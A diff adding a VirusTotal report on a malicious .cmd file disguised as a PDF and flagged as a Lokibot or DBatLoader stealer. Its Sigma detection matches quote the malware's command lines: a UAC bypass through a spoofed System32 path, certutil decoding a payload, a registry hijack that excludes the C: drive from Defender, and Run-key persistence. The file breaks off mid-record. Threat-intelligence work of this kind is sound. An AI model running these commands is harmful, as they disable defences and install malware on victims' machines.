@@ -1,0 +1,1709 @@
+{
+  "success": true,
+  "status_code": 200,
+  "json": {
+    "data": {
+      "id": "6a3e2eecb7f7f464c57a7159570d2d55c6893839be852af898089550265f5dfc",
+      "type": "file",
+      "links": {
+        "self": "https://www.virustotal.com/api/v3/files/6a3e2eecb7f7f464c57a7159570d2d55c6893839be852af898089550265f5dfc"
+      },
+      "attributes": {
+        "md5": "a7ecf2d80475a31c10bfdddd8c060548",
+        "last_analysis_stats": {
+          "malicious": 27,
+          "suspicious": 0,
+          "undetected": 34,
+          "harmless": 0,
+          "timeout": 0,
+          "confirmed-timeout": 0,
+          "failure": 0,
+          "type-unsupported": 14
+        },
+        "sandbox_verdicts": {
+          "Zenbox": {
+            "category": "malicious",
+            "malware_classification": [
+              "MALWARE",
+              "STEALER",
+              "TROJAN",
+              "EVADER"
+            ],
+            "sandbox_name": "Zenbox",
+            "malware_names": [
+              "Koadic",
+              "DBatLoader",
+              "Lokibot"
+            ],
+            "confidence": 100
+          }
+        },
+        "last_submission_date": 1728502482,
+        "names": [
+          "6a3e2eecb7f7f464c57a7159570d2d55c6893839be852af898089550265f5dfc.unknown",
+          "6a3e2eecb7f7f464c57a7159570d2d55c6893839be852af898089550265f5dfc.cmd",
+          "megerosites.cmd",
+          "megerosites.pdf",
+          "megerosites.virus"
+        ],
+        "last_modification_date": 1757058379,
+        "tags": [
+          "text",
+          "detect-debug-environment",
+          "long-sleeps",
+          "persistence"
+        ],
+        "sigma_analysis_results": [
+          {
+            "rule_level": "critical",
+            "rule_id": "804e7993351b779b371021d0b762692107233efc595e1171e5f9ebc62b851247",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "TrustedPath UAC Bypass Pattern",
+            "rule_description": "Detects indicators of a UAC bypass method by mocking directories",
+            "rule_author": "Florian Roth (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=0D361547308D54F3A22B6856D131A212C4DE5056,MD5=566A5E26AE9176EFD322B32C827CC535,SHA256=25032D083BEF92DAB877D5EAB9B28581962DBC9B43AA04820D8714728DC1064A,IMPHASH=E805586A12CB8FB7DC33AB574234D9D4",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "FodHelper.EXE",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Features On Demand Helper",
+                  "EventID": "1",
+                  "ParentCommandLine": "\"C:\\Windows\\sysnative\\cmd.exe\" /c \"C:\\Users\\Bruno\\AppData\\Local\\Temp\\73F9.tmp\\7409.tmp\\741A.bat C:\\Users\\Public\\Libraries\\ypbfdsfV.pif\"",
+                  "CommandLine": "\"C:\\\\Windows \\\\System32\\\\per.exe\"  ",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows \\System32\\per.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "209da224f420ee601f12f3cc1d00c8e1858190da8d89c39cba703253ef1c02e0",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Suspicious Binaries and Scripts in Public Folder",
+            "rule_description": "Detects the creation of a file with a suspicious extension in the public folder, which could indicate potential malicious activity.",
+            "rule_author": "The DFIR Report",
+            "match_context": [
+              {
+                "values": {
+                  "RuleName": "EXE",
+                  "Image": "C:\\Windows\\SysWOW64\\extrac32.exe",
+                  "EventID": "11",
+                  "TargetFilename": "C:\\Users\\Public\\alpha.exe"
+                }
+              },
+              {
+                "values": {
+                  "RuleName": "EXE",
+                  "Image": "C:\\Windows\\SysWOW64\\extrac32.exe",
+                  "TargetFilename": "C:\\Users\\Public\\kn.exe",
+                  "EventID": "11"
+                }
+              },
+              {
+                "values": {
+                  "Image": "C:\\Windows\\System32\\extrac32.exe",
+                  "EventID": "11",
+                  "TargetFilename": "C:\\Users\\Public\\alpha.exe"
+                }
+              },
+              {
+                "values": {
+                  "Image": "C:\\Windows\\system32\\extrac32.exe",
+                  "EventID": "11",
+                  "TargetFilename": "C:\\Users\\Public\\kn.exe"
+                }
+              },
+              {
+                "values": {
+                  "Image": "C:\\Windows\\system32\\extrac32.exe",
+                  "EventID": "11",
+                  "TargetFilename": "C:\\Users\\Public\\ger.exe"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "27b72c2678411f21ba21bd10b44b7e9c45594d5a5f61f14223b81a8906675039",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "New RUN Key Pointing to Suspicious Folder",
+            "rule_description": "Detects suspicious new RUN key element pointing to an executable in a suspicious folder",
+            "rule_author": "Florian Roth (Nextron Systems), Markus Neis, Sander Wiebing, Swachchhanda Shrawan Poudel (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Details": "C:\\Users\\Public\\Vfsdfbpy.url",
+                  "EventID": "13",
+                  "Image": "C:\\Users\\Public\\Libraries\\CLEAN.COM",
+                  "EventType": "SetValue",
+                  "TargetObject": "HKU\\S-1-5-21-1070296143-2877979003-364783958-1001\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Vfsdfbpy"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "2d3c931bf891955b7bf9d7745ece5f7bf306ac6c9a9ab72ee992a6d199bc2aae",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "File Decoded From Base64/Hex Via Certutil.EXE",
+            "rule_description": "Detects the execution of certutil with either the \"decode\" or \"decodehex\" flags to decode base64 or hex encoded files. This can be abused by attackers to decode an encoded payload before execution",
+            "rule_author": "Florian Roth (Nextron Systems), Jonhnathan Ribeiro, oscd.community",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "MD5=2EE61062AF648FF954408D422CA408F4,SHA256=1C010BFBF42A6A32EC9BFF5A3A559B51C983D77CE47D30074AA170417FA4CF1D,IMPHASH=92EAFDFBCF8B4ECD46E832973B0649D6",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "CertUtil.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "CertUtil.exe",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\kn  -decodehex -F \"C:\\Users\\Bruno\\Desktop\\install.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\kn   -decodehex -F \"C:\\Users\\Bruno\\Desktop\\install.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\kn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=C2319F1E8ADB193FC1B3466F32E4F134B97DF9E3,MD5=2D3C8A1DEA8BA4677B4199EAE9DE148B,SHA256=6AF299712FE257BF7A51CBA7E86206E43452040D82CF28180AD9F9EF13488692,IMPHASH=323A326D7B550351B75EC637A5575902",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "CertUtil.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "CertUtil.exe",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\kn  -decodehex -F \"C:\\Users\\Bruno\\Desktop\\run.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\kn   -decodehex -F \"C:\\Users\\Bruno\\Desktop\\run.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "FileVersion": "10.0.22621.1992 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\kn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=C2319F1E8ADB193FC1B3466F32E4F134B97DF9E3,MD5=2D3C8A1DEA8BA4677B4199EAE9DE148B,SHA256=6AF299712FE257BF7A51CBA7E86206E43452040D82CF28180AD9F9EF13488692,IMPHASH=323A326D7B550351B75EC637A5575902",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "CertUtil.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "CertUtil.exe",
+                  "FileVersion": "10.0.22621.1992 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\kn  -decodehex -F \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\"  \"C:\\\\Users\\\\Public\\\\Libraries\\\\CLEAN.COM\" 12   ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\kn   -decodehex -F \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\"  \"C:\\\\Users\\\\Public\\\\Libraries\\\\CLEAN.COM\" 12   ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\kn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "6a0e84509806d4477d42410fb267c817a01015e3dcc33e48330f8db0ba9709da",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Potential Defense Evasion Via Rename Of Highly Relevant Binaries",
+            "rule_description": "Detects the execution of a renamed binary often used by attackers or malware leveraging new Sysmon OriginalFileName datapoint.",
+            "rule_author": "Matthew Green - @mgreen27, Florian Roth (Nextron Systems), frack113",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "MD5=2EE61062AF648FF954408D422CA408F4,SHA256=1C010BFBF42A6A32EC9BFF5A3A559B51C983D77CE47D30074AA170417FA4CF1D,IMPHASH=92EAFDFBCF8B4ECD46E832973B0649D6",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "CertUtil.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "CertUtil.exe",
+                  "FileVersion": "10.0.19041.1 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\kn  -decodehex -F \"C:\\Users\\Bruno\\Desktop\\install.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\kn   -decodehex -F \"C:\\Users\\Bruno\\Desktop\\install.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\kn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=C2319F1E8ADB193FC1B3466F32E4F134B97DF9E3,MD5=2D3C8A1DEA8BA4677B4199EAE9DE148B,SHA256=6AF299712FE257BF7A51CBA7E86206E43452040D82CF28180AD9F9EF13488692,IMPHASH=323A326D7B550351B75EC637A5575902",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "CertUtil.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "CertUtil.exe",
+                  "FileVersion": "10.0.22621.1992 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\kn  -decodehex -F \"C:\\Users\\Bruno\\Desktop\\run.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\kn   -decodehex -F \"C:\\Users\\Bruno\\Desktop\\run.bat\"  \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\" 9    ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\kn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "CertUtil.exe",
+                  "Hashes": "SHA1=C2319F1E8ADB193FC1B3466F32E4F134B97DF9E3,MD5=2D3C8A1DEA8BA4677B4199EAE9DE148B,SHA256=6AF299712FE257BF7A51CBA7E86206E43452040D82CF28180AD9F9EF13488692,IMPHASH=323A326D7B550351B75EC637A5575902",
+                  "Description": "CertUtil.exe",
+                  "FileVersion": "10.0.22621.1992 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\kn  -decodehex -F \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\"  \"C:\\\\Users\\\\Public\\\\Libraries\\\\CLEAN.COM\" 12   ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\kn   -decodehex -F \"C:\\\\Users\\\\Public\\\\CLEAN.GIF\"  \"C:\\\\Users\\\\Public\\\\Libraries\\\\CLEAN.COM\" 12   ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\kn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "PowerShell.EXE",
+                  "Hashes": "SHA1=A72C41316307889E43FE8605A0DCA4A72E72A011,MD5=DCAADF7C9610B5EBEBDEDB1569EC4A9D,SHA256=D783BA6567FAF10FDFF2D0EA3864F6756862D6C733C7F4467283DA81AEDC3A80,IMPHASH=E09C4F82A1DA13A09F4FF2E625FEBA20",
+                  "Description": "Windows PowerShell",
+                  "FileVersion": "10.0.22621.2361 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c  C:\\\\Users\\\\Public\\\\xkn -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"C:\\\\Users\\\\Public\\\\alpha  /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d 'C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command \"Add-MpPreference -ExclusionPath C:\\\"' ;    \"   ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\xkn.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=979F280B1226E064CC79020B25FB8C40D9FB0008,MD5=CDB58D0BCABE76AFC60428F364834463,SHA256=411AE446FE37B30C0727888C7FA5E88994A46DAFD41AA5B3B06C9E884549AFDE,IMPHASH=1085BD82B37A225F6D356012D2E69C3D",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "reg.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Registry Console Tool",
+                  "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "\"C:\\Users\\Public\\alpha.exe\" /c C:\\\\Users\\\\Public\\\\ger add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"\"",
+                  "CommandLine": "C:\\\\Users\\\\Public\\\\ger  add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /f /ve /t REG_SZ /d \"C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"\"",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Users\\Public\\ger.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "84c8381801022afb55be7429db7a75474adba79984c4b957f33c62e931b0f282",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Potentially Suspicious Execution From Parent Process In Public Folder",
+            "rule_description": "Detects a potentially suspicious execution of a parent process located in the \"\\Users\\Public\" folder executing a child process containing references to shell or scripting binaries and commandlines.\n",
+            "rule_author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "MD5=9472AAB6390E4F1431BAA912FCFF9707,SHA256=A91D32973A1097EB1131FF630B0C082406703C48B8F442955DDA184C43BCE99E,IMPHASH=7B1D3FE0DC6AA68A34FB0D96A1457FE6",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "extrac32.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Microsoft\\xae CAB File Extract Utility",
+                  "FileVersion": "5.00 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c extrac32 /C /Y C:\\\\Windows\\\\System32\\\\certutil.exe C:\\\\Users\\\\Public\\\\kn.exe  ",
+                  "CommandLine": "extrac32  /C /Y C:\\\\Windows\\\\System32\\\\certutil.exe C:\\\\Users\\\\Public\\\\kn.exe  ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\SysWOW64\\extrac32.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=79C5AC3CE495D53D0F559A4EB2D5DFD5E55BB69A,MD5=23B49D7866A5E137C6A9B0F0B6AEEF94,SHA256=496A98E0603C2190A81A7EAD35145BC4D2AA8F5C70A16D2F2F4490ABDA49A98E,IMPHASH=CA57BDE6A23010D35AB579FD24F18E27",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "extrac32.exe",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Description": "Microsoft\\xae CAB File Extract Utility",
+                  "EventID": "1",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c extrac32 /C /Y C:\\\\Windows\\\\System32\\\\certutil.exe C:\\\\Users\\\\Public\\\\kn.exe  ",
+                  "CommandLine": "extrac32  /C /Y C:\\\\Windows\\\\System32\\\\certutil.exe C:\\\\Users\\\\Public\\\\kn.exe  ",
+                  "FileVersion": "5.00 (WinBuild.160101.0800)",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\extrac32.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\Users\\Public\\Libraries\\ypbfdsfV.pif",
+                  "CommandLine": "\"C:\\Windows\\sysnative\\cmd.exe\" /c \"C:\\Users\\Bruno\\AppData\\Local\\Temp\\73F9.tmp\\7409.tmp\\741A.bat C:\\Users\\Public\\Libraries\\ypbfdsfV.pif\"",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\Libraries\\ypbfdsfV.pif",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\cmd.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "extrac32.exe",
+                  "Hashes": "SHA1=79C5AC3CE495D53D0F559A4EB2D5DFD5E55BB69A,MD5=23B49D7866A5E137C6A9B0F0B6AEEF94,SHA256=496A98E0603C2190A81A7EAD35145BC4D2AA8F5C70A16D2F2F4490ABDA49A98E,IMPHASH=CA57BDE6A23010D35AB579FD24F18E27",
+                  "Description": "Microsoft\\xae CAB File Extract Utility",
+                  "FileVersion": "5.00 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\\\Users\\\\Public\\\\alpha  /c extrac32 /C /Y C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe \"C:\\\\Users\\\\Public\\\\xkn.exe\"  ",
+                  "CommandLine": "extrac32  /C /Y C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe \"C:\\\\Users\\\\Public\\\\xkn.exe\"  ",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\alpha.exe",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\extrac32.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "cd6c2801be2f14154f9616435303948eacedd79025bd0646cb3c34bb536b7cab",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Shell Open Registry Keys Manipulation",
+            "rule_description": "Detects the shell open key manipulation (exefile and ms-settings) used for persistence and the pattern of UAC Bypass using fodhelper.exe, computerdefaults.exe, slui.exe via registry keys (e.g. UACMe 33 or 62)",
+            "rule_author": "Christian Burkard (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Details": "C:\\\\Users\\\\Public\\\\xkn  -WindowStyle hidden -Command Add-MpPreference -ExclusionPath C:\"",
+                  "EventID": "13",
+                  "Image": "C:\\Users\\Public\\ger.exe",
+                  "EventType": "SetValue",
+                  "TargetObject": "HKU\\S-1-5-21-1070296143-2877979003-364783958-1001_Classes\\ms-settings\\shell\\open\\command\\(Default)"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "e3c2bad5a5af60244d315d33a3dc0534c602553aaeca2a895ba4ef848a637abb",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Suspicious Volume Shadow Copy Vssapi.dll Load",
+            "rule_description": "Detects the image load of VSS DLL by uncommon executables",
+            "rule_author": "frack113",
+            "match_context": [
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "Hashes": "SHA1=1676D991AF606494D9A64E01ED84F762B4A0BAAC,MD5=9C24F9E4C4458D5B48A5F918A4F9F228,SHA256=BEA016B2AF9724C3F8E123A79E3B44ABF59EE0669E7EF20CC3A9B4320E67FF7F,IMPHASH=083F175A977F7ACFDBAD8DA4288D1A04",
+                  "OriginalFileName": "VSSAPI.DLL",
+                  "ImageLoaded": "C:\\Windows\\SysWOW64\\vssapi.dll",
+                  "Description": "Microsoft\\xae Volume Shadow Copy Requestor/Writer Services API DLL",
+                  "SignatureStatus": "Valid",
+                  "EventID": "7",
+                  "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+                  "Signed": "true",
+                  "Signature": "Microsoft Windows",
+                  "Image": "C:\\Users\\Public\\Libraries\\CLEAN.COM",
+                  "Company": "Microsoft Corporation"
+                }
+              },
+              {
+                "values": {
+                  "Hashes": "SHA1=1676D991AF606494D9A64E01ED84F762B4A0BAAC,MD5=9C24F9E4C4458D5B48A5F918A4F9F228,SHA256=BEA016B2AF9724C3F8E123A79E3B44ABF59EE0669E7EF20CC3A9B4320E67FF7F,IMPHASH=083F175A977F7ACFDBAD8DA4288D1A04",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "OriginalFileName": "VSSAPI.DLL",
+                  "ImageLoaded": "C:\\Windows\\SysWOW64\\vssapi.dll",
+                  "Description": "Microsoft\\xae Volume Shadow Copy Requestor/Writer Services API DLL",
+                  "SignatureStatus": "Valid",
+                  "FileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+                  "EventID": "7",
+                  "Signature": "Microsoft Windows",
+                  "Signed": "true",
+                  "Image": "C:\\Users\\Public\\Libraries\\Vfsdfbpy.PIF",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "high",
+            "rule_id": "f07c498eb7cf9cd1bfbed63a62b591e3422513356d9b32adbb5dcf942f7b613b",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Trusted Path Bypass via Windows Directory Spoofing",
+            "rule_description": "Detects DLLs loading from a spoofed Windows directory path with an extra space (e.g \"C:\\Windows \\System32\") which can bypass Windows trusted path verification.\nThis technique tricks Windows into treating the path as trusted, allowing malicious DLLs to load with high integrity privileges bypassing UAC.\n",
+            "rule_author": "Swachchhanda Shrawan Poudel (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=0D361547308D54F3A22B6856D131A212C4DE5056,MD5=566A5E26AE9176EFD322B32C827CC535,SHA256=25032D083BEF92DAB877D5EAB9B28581962DBC9B43AA04820D8714728DC1064A,IMPHASH=E805586A12CB8FB7DC33AB574234D9D4",
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "OriginalFileName": "FodHelper.EXE",
+                  "ImageLoaded": "C:\\Windows \\System32\\per.exe",
+                  "Description": "Features On Demand Helper",
+                  "SignatureStatus": "Valid",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "EventID": "7",
+                  "Signed": "true",
+                  "Signature": "Microsoft Windows",
+                  "Image": "C:\\Windows \\System32\\per.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "1dfbc92aba26dc597751f9cf42ff3eac446b827525d1a38ea6fb4141c9f9af01",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Process Creation Using Sysnative Folder",
+            "rule_description": "Detects process creation events that use the Sysnative folder (common for CobaltStrike spawns)",
+            "rule_author": "Max Altgelt (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Product": "Microsoft\\xae Windows\\xae Operating System",
+                  "CurrentDirectory": "C:\\Users\\Bruno\\Desktop\\",
+                  "OriginalFileName": "Cmd.Exe",
+                  "Hashes": "SHA1=13E9BB7E85FF9B08C26A440412E5CD5D296C4D35,MD5=5A6BE4D2519515241D0C133A26CF62C0,SHA256=423E0E810A69AACEBA0E5670E58AFF898CF0EBFFAB99CCB46EBB3464C3D2FACB,IMPHASH=D73E39DAB3C8B57AA408073D01254964",
+                  "Description": "Windows Command Processor",
+                  "FileVersion": "10.0.22621.1635 (WinBuild.160101.0800)",
+                  "ParentCommandLine": "C:\\Users\\Public\\Libraries\\ypbfdsfV.pif",
+                  "CommandLine": "\"C:\\Windows\\sysnative\\cmd.exe\" /c \"C:\\Users\\Bruno\\AppData\\Local\\Temp\\73F9.tmp\\7409.tmp\\741A.bat C:\\Users\\Public\\Libraries\\ypbfdsfV.pif\"",
+                  "EventID": "1",
+                  "ParentImage": "C:\\Users\\Public\\Libraries\\ypbfdsfV.pif",
+                  "IntegrityLevel": "High",
+                  "Image": "C:\\Windows\\System32\\cmd.exe",
+                  "Company": "Microsoft Corporation"
+                }
+              }
+            ]
+          },
+          {
+            "rule_level": "medium",
+            "rule_id": "2104d1ee1ce64e7aa3dbd368652a54ce160e6a5751019af14601fc8fd1df8086",
+            "rule_source": "Sigma Integrated Rule Set (GitHub)",
+            "rule_title": "Execution of Suspicious File Type Extension",
+            "rule_description": "Detects whether the image specified in a process creation event doesn't refer to an \".exe\" (or other known executable extension) file. This can be caused by process ghosting or other unorthodox methods to start a process.\nThis rule might require some initial baselining to align with some third party tooling in the user environment.\n",
+            "rule_author": "Max Altgelt (Nextron Systems)",
+            "match_context": [
+              {
+                "values": {
+                  "Hashes": "SHA1=452B14432FB5758B46F2897AECCD89F7C82A727D,MD5=C116D3604CEAFE7057D77FF27552C215,SHA256=7BCDC2E607ABC65EF93AFD009C3048970D9E8D1C2A18FC571562396B13EBB301,IMPHASH=DD7B5EED6607225C03249C26D14A2571",
